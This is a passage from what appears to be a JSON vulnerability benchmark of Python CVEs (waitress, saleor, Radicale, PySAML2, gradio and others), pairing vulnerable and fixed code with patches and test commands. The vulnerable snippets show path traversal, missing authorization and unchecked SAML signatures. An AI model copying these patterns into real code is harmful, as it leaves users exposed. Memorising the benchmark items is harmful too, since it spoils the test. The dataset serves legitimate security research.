OBS_TEXT + \"]\"\n+FIELD_CONTENT = FIELD_VCHAR + \"(\" + RWS + FIELD_VCHAR + \"){0,}\"\n+FIELD_VALUE = \"(\" + FIELD_CONTENT + \"){0,}\"\n+\n+HEADER_FIELD = re.compile(\n+    tobytes(\n+        \"^(?P<name>\" + TOKEN + \"):\" + OWS + \"(?P<value>\" + FIELD_VALUE + \")\" + OWS + \"$\"\n+    )\n+)\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2019-16789:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/waitress\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2019-16789/bin/python -m pytest waitress/tests/test_parser.py -k \"test_parse_header_invalid_whitespace_vtab or test_parse_header_invalid_no_colon or test_parse_header_invalid_folding_spacing or test_parse_header_invalid_chars or test_parse_header_empty or test_parse_header_multiple_values or test_parse_header_multiple_values_header_folded or test_parse_header_multiple_values_header_folded_multiple\" --disable-warnings -v\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2019-16789:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/waitress\ngit apply --whitespace=nowarn /workspace/test.patch\n/workspace/PoC_env/CVE-2019-16789/bin/python -m pytest waitress/tests/test_parser.py -k \"not test_parse_header_invalid_chars and not test_parse_header_invalid_folding_spacing and not test_parse_header_invalid_no_colon and not test_parse_header_invalid_whitespace and not test_parse_header_invalid_whitespace_vtab\" --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2022-23603",
    "cve_description": "iTunesRPC-Remastered is a discord rich presence application for use with iTunes & Apple Music. In code before commit 24f43aa user input is not properly sanitized and code injection is possible. Users are advised to upgrade as soon as is possible. There are no known workarounds for this issue.",
    "cwe_info": {
      "CWE-116": {
        "name": "Improper Encoding or Escaping of Output",
        "description": "The product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved."
      }
    },
    "repo": "https://github.com/bildsben/iTunesRPC-Remastered",
    "patch_url": [
      "https://github.com/bildsben/iTunesRPC-Remastered/commit/24f43aac0f4116b3d89fdbe973ba92c6cfb0d998"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_313_1",
        "commit": "54b02d9",
        "file_path": "upload/server.py",
        "start_line": "1",
        "end_line": "8",
        "snippet": "import io                 \nimport base64                  \nimport logging\nimport random\nimport ast\nfrom PIL import Image\n\nfrom flask import Flask, request, jsonify, abort"
      },
      {
        "id": "vul_py_313_2",
        "commit": "54b02d9",
        "file_path": "upload/server.py",
        "start_line": "52",
        "end_line": "123",
        "snippet": "def uploadimage():\n    #print(request.json)   \n    if not request.json or 'image' not in request.json:\n        print(\"No data sent or no image provided. Aborting with 400.\")\n        abort(400)\n             \n    im_b64 = request.json['image']\n    img_bytes = base64.b64decode(im_b64.encode('utf-8'))\n    img = Image.open(io.BytesIO(img_bytes))\n\n    file_ending = img.format\n    print(f\"File has filetype {file_ending}.\")\n\n    if file_ending == \"JPEG\":\n        file_ending = \".jpg\"\n    else:\n        file_ending = \".png\"\n\n    one_hundred_million = 100000000\n    lots_of_nine = 999999999\n\n    file_name = None\n\n    f = open(\"all_files\", \"r\")\n    all_files = ast.literal_eval(f.read())\n    f.close()\n\n    attempt = 0\n\n    while file_name == None or file_name in all_files:\n        if attempt <= 1000:\n            file_name = random.randint(one_hundred_million, lots_of_nine)\n\n            file_name = base64.b64encode(str(file_name).encode(\"utf-8\")).decode(\"utf-8\")\n\n            print(f\"Trying new file name: {file_name}\")\n        else:\n            attempt = 0\n            one_hundred_million += 100000\n            lots_of_nine += 1000000\n\n            while one_hundred_million >= lots_of_nine:\n                one_hundred_million -= 10000\n\n            one_hundred_million -= 10000\n\n    print(f\"Successful file name: {file_name}\")\n\n    title = request.json[\"title\"]\n    print(\"First 9 chars of title: \"+str(title[:9]))\n    print(\"Title from 10th char: \"+str(title[9::]))\n    if title[:9] == \"[PAUSED] \":\n        title = title[9::]\n\n    singer = request.json[\"singer\"]\n    album = request.json[\"album\"]\n    \n    file_db_entry = [{\"title\": title, \"singer\": singer, \"album\": album}, file_name, file_ending]\n    print(f\"New db entry: {file_db_entry}\")\n\n    all_files.append(file_db_entry)\n\n    f = open(\"all_files\", \"w\")\n    f.write(str(all_files))\n    f.close()\n\n    file_name = file_name + file_ending\n\n    image = img.save(file_name)\n    print(f\"Saved {file_name} from {file_db_entry}.\")\n    print(f\"Returning {file_db_entry}.\")\n    return {\"entry\": file_db_entry}"
      },
      {
        "id": "vul_py_313_3",
        "commit": "54b02d9",
        "file_path": "module/connect_to_server.py",
        "start_line": "19",
        "end_line": "48",
        "snippet": "def get(image_file, domain, title, singer, album):\n    import base64\n    import json    \n    import ast               \n\n    import requests\n\n    api = f'http://{domain}:7873/bGVhdmVfcmlnaHRfbm93'\n\n    with open(image_file, \"rb\") as f:\n        im_bytes = f.read()        \n    im_b64 = base64.b64encode(im_bytes).decode(\"utf8\")\n\n    headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}\n\n    status = try_get_cached(domain, {\"title\": title, \"singer\": singer, \"album\": album})\n    status = ast.literal_eval(str(status))\n\n    if status == None:\n        print(\"Cached version not found. Uploading image with song metadata.\")\n        payload = json.dumps({\"image\": im_b64, \"title\": title, \"singer\": singer, \"album\": album})\n        response = requests.post(api, data=payload, headers=headers)\n\n        data = response.text[\"data\"]\n    else:\n        data = status\n\n    # data = [{\"title\": title, \"singer\": singer, \"album\": album}, file_name, file_ending]\n\n    return data"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_313_1",
        "commit": "24f43aa",
        "file_path": "upload/server.py",
        "start_line": "1",
        "end_line": "9",
        "snippet": "import io                 \nimport base64                  \nimport logging\nimport random\nimport ast\nfrom PIL import Image\n\nfrom flask import Flask, request, abort\nfrom html import escape"
      },
      {
        "id": "fix_py_313_2",
        "commit": "24f43aa",
        "file_path": "upload/server.py",
        "start_line": "53",
        "end_line": "124",
        "snippet": "def uploadimage():\n    #print(request.json)   \n    if not request.json or 'image' not in request.json:\n        print(\"No data sent or no image provided. Aborting with 400.\")\n        abort(400)\n             \n    im_b64 = request.json['image']\n    img_bytes = base64.b64decode(im_b64.encode('utf-8'))\n    img = Image.open(io.BytesIO(img_bytes))\n\n    file_ending = img.format\n    print(f\"File has filetype {file_ending}.\")\n\n    if file_ending == \"JPEG\":\n        file_ending = \".jpg\"\n    else:\n        file_ending = \".png\"\n\n    one_hundred_million = 100000000\n    lots_of_nine = 999999999\n\n    file_name = None\n\n    f = open(\"all_files\", \"r\")\n    all_files = ast.literal_eval(f.read())\n    f.close()\n\n    attempt = 0\n\n    while file_name == None or file_name in all_files:\n        if attempt <= 1000:\n            file_name = random.randint(one_hundred_million, lots_of_nine)\n\n            file_name = base64.b64encode(str(file_name).encode(\"utf-8\")).decode(\"utf-8\")\n\n            print(f\"Trying new file name: {file_name}\")\n        else:\n            attempt = 0\n            one_hundred_million += 100000\n            lots_of_nine += 1000000\n\n            while one_hundred_million >= lots_of_nine:\n                one_hundred_million -= 10000\n\n            one_hundred_million -= 10000\n\n    print(f\"Successful file name: {file_name}\")\n\n    title = request.json[\"title\"]\n    print(\"First 9 chars of title: \"+str(title[:9]))\n    print(\"Title from 10th char: \"+str(title[9::]))\n    if title[:9] == \"[PAUSED] \":\n        title = title[9::]\n\n    singer = request.json[\"singer\"]\n    album = request.json[\"album\"]\n    \n    file_db_entry = [{\"title\": title, \"singer\": singer, \"album\": album}, file_name, file_ending]\n    print(f\"New db entry: {file_db_entry}\")\n\n    all_files.append(file_db_entry)\n\n    f = open(\"all_files\", \"w\")\n    f.write(str(all_files))\n    f.close()\n\n    file_name = file_name + file_ending\n\n    image = img.save(file_name)\n    print(f\"Saved {file_name} from {file_db_entry}.\")\n    print(f\"Returning {file_db_entry}.\")\n    return escape({\"entry\": file_db_entry})"
      },
      {
        "id": "fix_py_313_3",
        "commit": "24f43aa",
        "file_path": "module/connect_to_server.py",
        "start_line": "19",
        "end_line": "49",
        "snippet": "def get(image_file, domain, title, singer, album):\n    import base64\n    import json    \n    import ast\n    from html import unescape         \n\n    import requests\n\n    api = f'http://{domain}:7873/bGVhdmVfcmlnaHRfbm93'\n\n    with open(image_file, \"rb\") as f:\n        im_bytes = f.read()        \n    im_b64 = base64.b64encode(im_bytes).decode(\"utf8\")\n\n    headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}\n\n    status = try_get_cached(domain, {\"title\": title, \"singer\": singer, \"album\": album})\n    status = ast.literal_eval(str(status))\n\n    if status == None:\n        print(\"Cached version not found. Uploading image with song metadata.\")\n        payload = json.dumps({\"image\": im_b64, \"title\": title, \"singer\": singer, \"album\": album})\n        response = requests.post(api, data=payload, headers=headers)\n\n        data = unescape(response.text[\"entry\"])\n    else:\n        data = status\n\n    # data = [{\"title\": title, \"singer\": singer, \"album\": album}, file_name, file_ending]\n\n    return data"
      }
    ],
    "vul_patch": "--- a/upload/server.py\n+++ b/upload/server.py\n@@ -5,4 +5,5 @@\n import ast\n from PIL import Image\n \n-from flask import Flask, request, jsonify, abort\n+from flask import Flask, request, abort\n+from html import escape\n\n--- a/upload/server.py\n+++ b/upload/server.py\n@@ -69,4 +69,4 @@\n     image = img.save(file_name)\n     print(f\"Saved {file_name} from {file_db_entry}.\")\n     print(f\"Returning {file_db_entry}.\")\n-    return {\"entry\": file_db_entry}\n+    return escape({\"entry\": file_db_entry})\n\n--- a/module/connect_to_server.py\n+++ b/module/connect_to_server.py\n@@ -1,7 +1,8 @@\n def get(image_file, domain, title, singer, album):\n     import base64\n     import json    \n-    import ast               \n+    import ast\n+    from html import unescape         \n \n     import requests\n \n@@ -21,7 +22,7 @@\n         payload = json.dumps({\"image\": im_b64, \"title\": title, \"singer\": singer, \"album\": album})\n         response = requests.post(api, data=payload, headers=headers)\n \n-        data = response.text[\"data\"]\n+        data = unescape(response.text[\"entry\"])\n     else:\n         data = status\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-0932",
    "cve_description": "Missing Authorization in GitHub repository saleor/saleor prior to 3.1.2.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      }
    },
    "repo": "https://github.com/saleor/saleor",
    "patch_url": [
      "https://github.com/saleor/saleor/commit/521dfd6394f3926a77c60d8633c058e16d0f916d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_192_1",
        "commit": "035bf70",
        "file_path": "saleor/graphql/account/types.py",
        "start_line": 364,
        "end_line": 375,
        "snippet": "        def _resolve_orders(orders):\n            requester = get_user_or_app_from_context(info.context)\n            if not requester.has_perm(OrderPermissions.MANAGE_ORDERS):\n                orders = list(\n                    filter(lambda order: order.status != OrderStatus.DRAFT, orders)\n                )\n\n            return create_connection_slice(\n                orders, info, kwargs, OrderCountableConnection\n            )\n\n        return OrdersByUserLoader(info.context).load(root.id).then(_resolve_orders)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_192_1",
        "commit": "521dfd6",
        "file_path": "saleor/graphql/account/types.py",
        "start_line": 364,
        "end_line": 379,
        "snippet": "        def _resolve_orders(orders):\n            requester = get_user_or_app_from_context(info.context)\n            if not requester.has_perm(OrderPermissions.MANAGE_ORDERS):\n                # allow fetch requestor orders (except drafts)\n                if root == info.context.user:\n                    orders = list(\n                        filter(lambda order: order.status != OrderStatus.DRAFT, orders)\n                    )\n                else:\n                    raise PermissionDenied()\n\n            return create_connection_slice(\n                orders, info, kwargs, OrderCountableConnection\n            )\n\n        return OrdersByUserLoader(info.context).load(root.id).then(_resolve_orders)"
      }
    ],
    "vul_patch": "--- a/saleor/graphql/account/types.py\n+++ b/saleor/graphql/account/types.py\n@@ -1,9 +1,13 @@\n         def _resolve_orders(orders):\n             requester = get_user_or_app_from_context(info.context)\n             if not requester.has_perm(OrderPermissions.MANAGE_ORDERS):\n-                orders = list(\n-                    filter(lambda order: order.status != OrderStatus.DRAFT, orders)\n-                )\n+                # allow fetch requestor orders (except drafts)\n+                if root == info.context.user:\n+                    orders = list(\n+                        filter(lambda order: order.status != OrderStatus.DRAFT, orders)\n+                    )\n+                else:\n+                    raise PermissionDenied()\n \n             return create_connection_slice(\n                 orders, info, kwargs, OrderCountableConnection\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-8747",
    "cve_description": "The multifilesystem storage backend in Radicale before 1.1 allows remote attackers to read or write to arbitrary files via a crafted component name.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/Unrud/Radicale",
    "patch_url": [
      "https://github.com/Unrud/Radicale/commit/bcaf452e516c02c9bed584a73736431c5e8831f1"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_252_1",
        "commit": "b4b3d51",
        "file_path": "radicale/storage/multifilesystem.py",
        "start_line": 48,
        "end_line": 58,
        "snippet": "    def write(self):\n        self._create_dirs()\n        for component in self.components:\n            text = ical.serialize(\n                self.tag, self.headers, [component] + self.timezones)\n            name = (\n                component.name if sys.version_info[0] >= 3 else\n                component.name.encode(filesystem.FILESYSTEM_ENCODING))\n            filesystem_path = os.path.join(self._filesystem_path, name)\n            with filesystem.open(filesystem_path, \"w\") as fd:\n                fd.write(text)"
      },
      {
        "id": "vul_py_252_2",
        "commit": "b4b3d51",
        "file_path": "radicale/storage/multifilesystem.py",
        "start_line": 64,
        "end_line": 67,
        "snippet": "    def remove(self, name):\n        filesystem_path = os.path.join(self._filesystem_path, name)\n        if os.path.exists(filesystem_path):\n            os.remove(filesystem_path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_252_1",
        "commit": "bcaf452",
        "file_path": "radicale/storage/multifilesystem.py",
        "start_line": 48,
        "end_line": 63,
        "snippet": "    def write(self):\n        self._create_dirs()\n        for component in self.components:\n            text = ical.serialize(\n                self.tag, self.headers, [component] + self.timezones)\n            name = (\n                component.name if sys.version_info[0] >= 3 else\n                component.name.encode(filesystem.FILESYSTEM_ENCODING))\n            if not pathutils.is_safe_filesystem_path_component(name):\n                log.LOGGER.debug(\n                    \"Can't tranlate name safely to filesystem, \"\n                    \"skipping component: %s\", name)\n                continue\n            filesystem_path = os.path.join(self._filesystem_path, name)\n            with filesystem.open(filesystem_path, \"w\") as fd:\n                fd.write(text)"
      },
      {
        "id": "fix_py_252_2",
        "commit": "bcaf452",
        "file_path": "radicale/storage/multifilesystem.py",
        "start_line": 69,
        "end_line": 77,
        "snippet": "    def remove(self, name):\n        if not pathutils.is_safe_filesystem_path_component(name):\n            log.LOGGER.debug(\n                \"Can't tranlate name safely to filesystem, \"\n                \"skipping component: %s\", name)\n            return\n        filesystem_path = os.path.join(self._filesystem_path, name)\n        if os.path.exists(filesystem_path):\n            os.remove(filesystem_path)"
      }
    ],
    "vul_patch": "--- a/radicale/storage/multifilesystem.py\n+++ b/radicale/storage/multifilesystem.py\n@@ -6,6 +6,11 @@\n             name = (\n                 component.name if sys.version_info[0] >= 3 else\n                 component.name.encode(filesystem.FILESYSTEM_ENCODING))\n+            if not pathutils.is_safe_filesystem_path_component(name):\n+                log.LOGGER.debug(\n+                    \"Can't tranlate name safely to filesystem, \"\n+                    \"skipping component: %s\", name)\n+                continue\n             filesystem_path = os.path.join(self._filesystem_path, name)\n             with filesystem.open(filesystem_path, \"w\") as fd:\n                 fd.write(text)\n\n--- a/radicale/storage/multifilesystem.py\n+++ b/radicale/storage/multifilesystem.py\n@@ -1,4 +1,9 @@\n     def remove(self, name):\n+        if not pathutils.is_safe_filesystem_path_component(name):\n+            log.LOGGER.debug(\n+                \"Can't tranlate name safely to filesystem, \"\n+                \"skipping component: %s\", name)\n+            return\n         filesystem_path = os.path.join(self._filesystem_path, name)\n         if os.path.exists(filesystem_path):\n             os.remove(filesystem_path)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-5390",
    "cve_description": "PySAML2 before 5.0.0 does not check that the signature in a SAML document is enveloped and thus signature wrapping is effective, i.e., it is affected by XML Signature Wrapping (XSW). The signature information and the node/object that is signed can be in different places and thus the signature verification will succeed, but the wrong data will be used. This specifically affects the verification of assertion that have been signed.",
    "cwe_info": {
      "CWE-347": {
        "name": "Improper Verification of Cryptographic Signature",
        "description": "The product does not verify, or incorrectly verifies, the cryptographic signature for data."
      }
    },
    "repo": "https://github.com/IdentityPython/pysaml2",
    "patch_url": [
      "https://github.com/IdentityPython/pysaml2/commit/5e9d5acbcd8ae45c4e736ac521fd2df5b1c62e25"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_422_1",
        "commit": "324656e",
        "file_path": "src/saml2/sigver.py",
        "start_line": 1431,
        "end_line": 1506,
        "snippet": "    def _check_signature(self, decoded_xml, item, node_name=NODE_NAME, origdoc=None, id_attr='', must=False, only_valid_cert=False, issuer=None):\n        try:\n            _issuer = item.issuer.text.strip()\n        except AttributeError:\n            _issuer = None\n\n        if _issuer is None:\n            try:\n                _issuer = issuer.text.strip()\n            except AttributeError:\n                _issuer = None\n\n        # More trust in certs from metadata then certs in the XML document\n        if self.metadata:\n            try:\n                _certs = self.metadata.certs(_issuer, 'any', 'signing')\n            except KeyError:\n                _certs = []\n            certs = []\n\n            for cert in _certs:\n                if isinstance(cert, six.string_types):\n                    content = pem_format(cert)\n                    tmp = make_temp(content,\n                                    suffix=\".pem\",\n                                    decode=False,\n                                    delete_tmpfiles=self.delete_tmpfiles)\n                    certs.append(tmp)\n                else:\n                    certs.append(cert)\n        else:\n            certs = []\n\n        if not certs and not self.only_use_keys_in_metadata:\n            logger.debug('==== Certs from instance ====')\n            certs = [\n                make_temp(content=pem_format(cert),\n                          suffix=\".pem\",\n                          decode=False,\n                          delete_tmpfiles=self.delete_tmpfiles)\n                for cert in cert_from_instance(item)\n            ]\n        else:\n            logger.debug('==== Certs from metadata ==== %s: %s ====', _issuer, certs)\n\n        if not certs:\n            raise MissingKey(_issuer)\n\n        verified = False\n        last_pem_file = None\n\n        for pem_fd in certs:\n            try:\n                last_pem_file = pem_fd.name\n                if self.verify_signature(\n                        decoded_xml,\n                        pem_fd.name,\n                        node_name=node_name,\n                        node_id=item.id,\n                        id_attr=id_attr):\n                    verified = True\n                    break\n            except XmlsecError as exc:\n                logger.error('check_sig: %s', exc)\n                pass\n            except Exception as exc:\n                logger.error('check_sig: %s', exc)\n                raise\n\n        if verified or only_valid_cert:\n            if not self.cert_handler.verify_cert(last_pem_file):\n                raise CertificateError('Invalid certificate!')\n        else:\n            raise SignatureError('Failed to verify signature')\n\n        return item"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_422_1",
        "commit": "5e9d5acbcd8ae45c4e736ac521fd2df5b1c62e25",
        "file_path": "src/saml2/sigver.py",
        "start_line": 1431,
        "end_line": 1555,
        "snippet": "    def _check_signature(self, decoded_xml, item, node_name=NODE_NAME, origdoc=None, id_attr='', must=False, only_valid_cert=False, issuer=None):\n        try:\n            _issuer = item.issuer.text.strip()\n        except AttributeError:\n            _issuer = None\n\n        if _issuer is None:\n            try:\n                _issuer = issuer.text.strip()\n            except AttributeError:\n                _issuer = None\n\n        # More trust in certs from metadata then certs in the XML document\n        if self.metadata:\n            try:\n                _certs = self.metadata.certs(_issuer, 'any', 'signing')\n            except KeyError:\n                _certs = []\n            certs = []\n\n            for cert in _certs:\n                if isinstance(cert, six.string_types):\n                    content = pem_format(cert)\n                    tmp = make_temp(content,\n                                    suffix=\".pem\",\n                                    decode=False,\n                                    delete_tmpfiles=self.delete_tmpfiles)\n                    certs.append(tmp)\n                else:\n                    certs.append(cert)\n        else:\n            certs = []\n\n        if not certs and not self.only_use_keys_in_metadata:\n            logger.debug('==== Certs from instance ====')\n            certs = [\n                make_temp(content=pem_format(cert),\n                          suffix=\".pem\",\n                          decode=False,\n                          delete_tmpfiles=self.delete_tmpfiles)\n                for cert in cert_from_instance(item)\n            ]\n        else:\n            logger.debug('==== Certs from metadata ==== %s: %s ====', _issuer, certs)\n\n        if not certs:\n            raise MissingKey(_issuer)\n\n        # saml-core section \"5.4 XML Signature Profile\" defines constrains on the\n        # xmldsig-core facilities. It explicitly dictates that enveloped signatures\n        # are the only signatures allowed. This mean that:\n        # * Assertion/RequestType/ResponseType elements must have an ID attribute\n        # * signatures must have a single Reference element\n        # * the Reference element must have a URI attribute\n        # * the URI attribute contains an anchor\n        # * the anchor points to the enclosing element's ID attribute\n        references = item.signature.signed_info.reference\n        signatures_must_have_a_single_reference_element = len(references) == 1\n        the_Reference_element_must_have_a_URI_attribute = (\n            signatures_must_have_a_single_reference_element\n            and hasattr(references[0], \"uri\")\n        )\n        the_URI_attribute_contains_an_anchor = (\n            the_Reference_element_must_have_a_URI_attribute\n            and references[0].uri.startswith(\"#\")\n            and len(references[0].uri) > 1\n        )\n        the_anchor_points_to_the_enclosing_element_ID_attribute = (\n            the_URI_attribute_contains_an_anchor\n            and references[0].uri == \"#{id}\".format(id=item.id)\n        )\n        validators = {\n            \"signatures must have a single reference element\": (\n                signatures_must_have_a_single_reference_element\n            ),\n            \"the Reference element must have a URI attribute\": (\n                the_Reference_element_must_have_a_URI_attribute\n            ),\n            \"the URI attribute contains an anchor\": (\n                the_URI_attribute_contains_an_anchor\n            ),\n            \"the anchor points to the enclosing element ID attribute\": (\n                the_anchor_points_to_the_enclosing_element_ID_attribute\n            ),\n        }\n        if not all(validators.values()):\n            error_context = {\n                \"message\": \"Signature failed to meet constraints on xmldsig\",\n                \"validators\": validators,\n                \"item ID\": item.id,\n                \"reference URI\": item.signature.signed_info.reference[0].uri,\n                \"issuer\": _issuer,\n                \"node name\": node_name,\n                \"xml document\": decoded_xml,\n            }\n            raise SignatureError(error_context)\n\n        verified = False\n        last_pem_file = None\n\n        for pem_fd in certs:\n            try:\n                last_pem_file = pem_fd.name\n                if self.verify_signature(\n                        decoded_xml,\n                        pem_fd.name,\n                        node_name=node_name,\n                        node_id=item.id,\n                        id_attr=id_attr):\n                    verified = True\n                    break\n            except XmlsecError as exc:\n                logger.error('check_sig: %s', exc)\n                pass\n            except Exception as exc:\n                logger.error('check_sig: %s', exc)\n                raise\n\n        if verified or only_valid_cert:\n            if not self.cert_handler.verify_cert(last_pem_file):\n                raise CertificateError('Invalid certificate!')\n        else:\n            raise SignatureError('Failed to verify signature')\n\n        return item"
      }
    ],
    "vul_patch": "--- a/src/saml2/sigver.py\n+++ b/src/saml2/sigver.py\n@@ -46,6 +46,55 @@\n         if not certs:\n             raise MissingKey(_issuer)\n \n+        # saml-core section \"5.4 XML Signature Profile\" defines constrains on the\n+        # xmldsig-core facilities. It explicitly dictates that enveloped signatures\n+        # are the only signatures allowed. This mean that:\n+        # * Assertion/RequestType/ResponseType elements must have an ID attribute\n+        # * signatures must have a single Reference element\n+        # * the Reference element must have a URI attribute\n+        # * the URI attribute contains an anchor\n+        # * the anchor points to the enclosing element's ID attribute\n+        references = item.signature.signed_info.reference\n+        signatures_must_have_a_single_reference_element = len(references) == 1\n+        the_Reference_element_must_have_a_URI_attribute = (\n+            signatures_must_have_a_single_reference_element\n+            and hasattr(references[0], \"uri\")\n+        )\n+        the_URI_attribute_contains_an_anchor = (\n+            the_Reference_element_must_have_a_URI_attribute\n+            and references[0].uri.startswith(\"#\")\n+            and len(references[0].uri) > 1\n+        )\n+        the_anchor_points_to_the_enclosing_element_ID_attribute = (\n+            the_URI_attribute_contains_an_anchor\n+            and references[0].uri == \"#{id}\".format(id=item.id)\n+        )\n+        validators = {\n+            \"signatures must have a single reference element\": (\n+                signatures_must_have_a_single_reference_element\n+            ),\n+            \"the Reference element must have a URI attribute\": (\n+                the_Reference_element_must_have_a_URI_attribute\n+            ),\n+            \"the URI attribute contains an anchor\": (\n+                the_URI_attribute_contains_an_anchor\n+            ),\n+            \"the anchor points to the enclosing element ID attribute\": (\n+                the_anchor_points_to_the_enclosing_element_ID_attribute\n+            ),\n+        }\n+        if not all(validators.values()):\n+            error_context = {\n+                \"message\": \"Signature failed to meet constraints on xmldsig\",\n+                \"validators\": validators,\n+                \"item ID\": item.id,\n+                \"reference URI\": item.signature.signed_info.reference[0].uri,\n+                \"issuer\": _issuer,\n+                \"node name\": node_name,\n+                \"xml document\": decoded_xml,\n+            }\n+            raise SignatureError(error_context)\n+\n         verified = False\n         last_pem_file = None\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-31549",
    "cve_description": "The olmax99/helm-flask-celery repository before 2022-05-25 on GitHub allows absolute path traversal because the Flask send_file function is used unsafely.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/olmax99/helm-flask-celery",
    "patch_url": [
      "https://github.com/olmax99/helm-flask-celery/commit/28c985d712d7ac26893433e8035e2e3678fcae9f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_93_1",
        "commit": "0e8a6bd",
        "file_path": "webapiservice/flaskapi/core/app_setup.py",
        "start_line": "78",
        "end_line": "87",
        "snippet": "def route_frontend(path):\n    # ...could be a static file needed by the front end that\n    # doesn't use the `static` path (like in `<script src=\"bundle.js\">`)\n    file_path = os.path.join(current_app.template_folder, path)\n    if os.path.isfile(file_path):\n        return send_file(file_path)\n    # ...or should be handled by the SPA's \"router\" in front end\n    else:\n        index_path = os.path.join(current_app.static_folder, 'index.html')\n        return send_file(index_path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_93_1",
        "commit": "28c985d",
        "file_path": "webapiservice/flaskapi/core/app_setup.py",
        "start_line": "78",
        "end_line": "87",
        "snippet": "def route_frontend(path):\n    # ...could be a static file needed by the front end that\n    # doesn't use the `static` path (like in `<script src=\"bundle.js\">`)\n    file_path = safe_join(current_app.template_folder, path)\n    if os.path.isfile(file_path):\n        return send_file(file_path)\n    # ...or should be handled by the SPA's \"router\" in front end\n    else:\n        index_path = os.path.join(current_app.static_folder, 'index.html')\n        return send_file(index_path)"
      }
    ],
    "vul_patch": "--- a/webapiservice/flaskapi/core/app_setup.py\n+++ b/webapiservice/flaskapi/core/app_setup.py\n@@ -1,7 +1,7 @@\n def route_frontend(path):\n     # ...could be a static file needed by the front end that\n     # doesn't use the `static` path (like in `<script src=\"bundle.js\">`)\n-    file_path = os.path.join(current_app.template_folder, path)\n+    file_path = safe_join(current_app.template_folder, path)\n     if os.path.isfile(file_path):\n         return send_file(file_path)\n     # ...or should be handled by the SPA's \"router\" in front end\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-1183",
    "cve_description": "An SSRF (Server-Side Request Forgery) vulnerability exists in the gradio-app/gradio repository, allowing attackers to scan and identify open ports within an internal network. By manipulating the 'file' parameter in a GET request, an attacker can discern the status of internal ports based on the presence of a 'Location' header or a 'File not allowed' error in the response.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/gradio-app/gradio",
    "patch_url": [
      "https://github.com/gradio-app/gradio/commit/7ba8c5da45b004edd12c0460be9222f5b5f5f055",
      "https://github.com/gradio-app/gradio/commit/2ad3d9e7ec6c8eeea59774265b44f11df7394bb4"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_82_1",
        "commit": "dc131b6",
        "file_path": "gradio/routes.py",
        "start_line": "434",
        "end_line": "484",
        "snippet": "        async def file(path_or_url: str, request: fastapi.Request):\n            blocks = app.get_blocks()\n            if utils.validate_url(path_or_url):\n                return RedirectResponse(\n                    url=path_or_url, status_code=status.HTTP_302_FOUND\n                )\n            abs_path = utils.abspath(path_or_url)\n\n            in_blocklist = any(\n                utils.is_in_or_equal(abs_path, blocked_path)\n                for blocked_path in blocks.blocked_paths\n            )\n            is_dir = abs_path.is_dir()\n\n            if in_blocklist or is_dir:\n                raise HTTPException(403, f\"File not allowed: {path_or_url}.\")\n\n            created_by_app = str(abs_path) in set().union(*blocks.temp_file_sets)\n            in_allowlist = any(\n                utils.is_in_or_equal(abs_path, allowed_path)\n                for allowed_path in blocks.allowed_paths\n            )\n            was_uploaded = utils.is_in_or_equal(abs_path, app.uploaded_file_dir)\n            is_cached_example = utils.is_in_or_equal(\n                abs_path, utils.abspath(CACHED_FOLDER)\n            )\n\n            if not (\n                created_by_app or in_allowlist or was_uploaded or is_cached_example\n            ):\n                raise HTTPException(403, f\"File not allowed: {path_or_url}.\")\n\n            if not abs_path.exists():\n                raise HTTPException(404, f\"File not found: {path_or_url}.\")\n\n            range_val = request.headers.get(\"Range\", \"\").strip()\n            if range_val.startswith(\"bytes=\") and \"-\" in range_val:\n                range_val = range_val[6:]\n                start, end = range_val.split(\"-\")\n                if start.isnumeric() and end.isnumeric():\n                    start = int(start)\n                    end = int(end)\n                    response = ranged_response.RangedFileResponse(\n                        abs_path,\n                        ranged_response.OpenRange(start, end),\n                        dict(request.headers),\n                        